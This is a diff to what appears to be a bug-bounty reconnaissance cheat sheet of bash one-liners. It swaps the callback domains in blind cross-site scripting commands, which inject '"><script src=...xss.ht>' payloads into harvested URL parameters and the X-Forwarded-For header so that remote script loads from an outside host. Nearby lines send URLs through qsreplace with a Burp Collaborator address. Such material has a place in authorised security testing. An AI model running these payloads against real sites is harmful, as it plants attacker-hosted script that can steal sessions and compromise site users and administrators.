@@ -794,14 +794,12 @@ cat finalwaybackurls | grep "=" | qsreplace https://YOUR.burpcollaborator.net | 
 ```
 > Blind XSS In Parameters
 ```bash
-cat finalwaybackurls | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
+cat finalwaybackurls | grep "&" | bxss -appendMode -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -parameters
 ```
 > Blind XSS In X-Forwarded-For Header
 ```bash
-cat finalwaybackurls | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"
+cat finalwaybackurls | bxss -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -header "X-Forwarded-For"
 ```
-
-
 ```bash
 cat finalwaybackurls | grep "=" | Gxss -c 100 -o gxss -v
 ```
@@ -809,6 +807,7 @@ cat finalwaybackurls | grep "=" | Gxss -c 100 -o gxss -v
 ```bash
 cat finalwaybackurls | subjs | sort -u | tee ./subjs
 ```
+
 
 - 9th Command for collect all urls
 ```bash
